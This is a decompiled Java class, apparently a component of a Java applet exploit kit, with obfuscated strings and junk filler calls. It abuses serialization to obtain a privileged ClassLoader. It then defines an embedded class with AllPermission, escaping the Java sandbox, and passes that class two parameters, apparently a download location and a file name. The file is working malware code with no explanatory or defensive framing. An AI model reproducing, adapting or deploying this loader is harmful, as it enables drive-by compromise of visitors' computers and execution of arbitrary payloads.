// 
// Decompiled by Procyon v0.5.30
// 

package ghsdr;

import java.lang.reflect.Field;
import java.io.InputStream;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.Permission;
import java.security.AllPermission;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.net.URL;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import I.I;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class Gedsrdc extends ClassLoader implements Serializable
{
    private static final long serialVersionUID = 6812622870313961944L;
    public static Gedsrdc I;
    
    private void writeObject(final ObjectOutputStream objectOutputStream) {
        I.I.I(2866);
        I.I.I(2873);
        I.I.I(2878);
        objectOutputStream.defaultWriteObject();
        I.I.I(2886);
        I.I.I(2891);
    }
    
    private void readObject(final ObjectInputStream objectInputStream) {
        I.I.I(2825);
        I.I.I(2833);
        Gedsrdc.I = this;
        I.I.I(2841);
        I.I.I(2846);
        objectInputStream.defaultReadObject();
        I.I.I(2851);
        I.I.I(2859);
    }
    
    public final void I(final String s, final String s2) {
        I.I.I(1804);
        I.I.I(1813);
        I.I.I(1821);
        I.I.I(1828);
        I.I.I(1834);
        I.I.I(1840);
        I.I.I(1848);
        I.I.I(1854);
        I.I.I(1863);
        I.I.I(1869);
        I.I.I(1878);
        I.I.I(1887);
        try {
            I.I.I(1895);
            I.I.I(1902);
            I.I.I(1911);
            I.I.I(1918);
            I.I.I(1926);
            I.I.I(1932);
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            I.I.I(1939);
            I.I.I(1946);
            I.I.I(1951);
            final byte[] array = new byte[8192];
            I.I.I(1960);
            I.I.I(1969);
            I.I.I(1976);
            I.I.I(1981);
            I.I.I(1990);
            I.I.I(1998);
            final String replace = I.I.I(2006).replace(I.I.I(2013), "").replace('.', '/');
            I.I.I(2015);
            I.I.I(2024);
            I.I.I(2031);
            I.I.I(2036);
            I.I.I(2043);
            I.I.I(2051);
            final InputStream resourceAsStream = this.getClass().getResourceAsStream(I.I.I(2057).replace(I.I.I(206), "") + replace + I.I.I(2063).replace(I.I.I(2109), ""));
            I.I.I(2111);
            I.I.I(2119);
            I.I.I(2125);
            I.I.I(2131);
            I.I.I(2138);
            I.I.I(2147);
            I.I.I(2155);
            I.I.I(2161);
            I.I.I(2170);
            I.I.I(2179);
            I.I.I(2185);
            I.I.I(2194);
            int read;
            while ((read = resourceAsStream.read(array)) > 0) {
                I.I.I(2203);
                I.I.I(2209);
                I.I.I(2218);
                byteArrayOutputStream.write(array, 0, read);
                I.I.I(2226);
                I.I.I(2235);
                I.I.I(2241);
            }
            I.I.I(2250);
            I.I.I(2257);
            I.I.I(2262);
            I.I.I(2271);
            I.I.I(2277);
            I.I.I(2284);
            final byte[] byteArray = byteArrayOutputStream.toByteArray();
            I.I.I(2292);
            I.I.I(2297);
            I.I.I(2305);
            final URL url = new URL(I.I.I(2314).replace(I.I.I(2339), ""));
            I.I.I(2341);
            I.I.I(2348);
            I.I.I(2357);
            I.I.I(2366);
            I.I.I(2373);
            I.I.I(2378);
            final Certificate[] array2 = new Certificate[0];
            I.I.I(2386);
            I.I.I(2393);
            I.I.I(2401);
            final Permissions permissions = new Permissions();
            I.I.I(2407);
            I.I.I(2412);
            I.I.I(2418);
            permissions.add(new AllPermission());
            I.I.I(2424);
            I.I.I(2433);
            I.I.I(2439);
            final ProtectionDomain protectionDomain = new ProtectionDomain(new CodeSource(url, array2), permissions);
            I.I.I(2444);
            I.I.I(2449);
            I.I.I(2455);
            I.I.I(2463);
            I.I.I(2470);
            I.I.I(2478);
            final Class<?> defineClass = this.defineClass(I.I.I(2486).replace(I.I.I(2512), ""), byteArray, 0, byteArray.length, protectionDomain);
            I.I.I(2514);
            I.I.I(2521);
            I.I.I(2526);
            I.I.I(2533);
            I.I.I(2540);
            I.I.I(2547);
            if (defineClass != null) {
                I.I.I(2552);
                I.I.I(2557);
                I.I.I(2563);
                final Field field = defineClass.getField(I.I.I(2570).replace(I.I.I(2579), ""));
                I.I.I(2581);
                I.I.I(2587);
                I.I.I(2594);
                final Field field2 = defineClass.getField(I.I.I(2600).replace(I.I.I(2610), ""));
                I.I.I(2612);
                I.I.I(2619);
                I.I.I(2627);
                final Object instance = defineClass.newInstance();
                I.I.I(2636);
                I.I.I(2645);
                I.I.I(2654);
                field.set(instance, s);
                I.I.I(2660);
                I.I.I(2666);
                I.I.I(2673);
                field2.set(instance, s2);
                I.I.I(2678);
                I.I.I(2684);
                I.I.I(2691);
                defineClass.newInstance();
                I.I.I(2699);
                I.I.I(2705);
                I.I.I(2712);
            }
            I.I.I(2717);
            I.I.I(2724);
            I.I.I(2731);
            I.I.I(2737);
            I.I.I(2745);
            I.I.I(2754);
        }
        catch (Exception ex) {
            I.I.I(2763);
            I.I.I(2770);
            I.I.I(2776);
            I.I.I(2782);
            I.I.I(2791);
            I.I.I(2796);
        }
        I.I.I(2803);
        I.I.I(2809);
        I.I.I(2818);
    }
    
    static {
        Gedsrdc.I = null;
    }
}
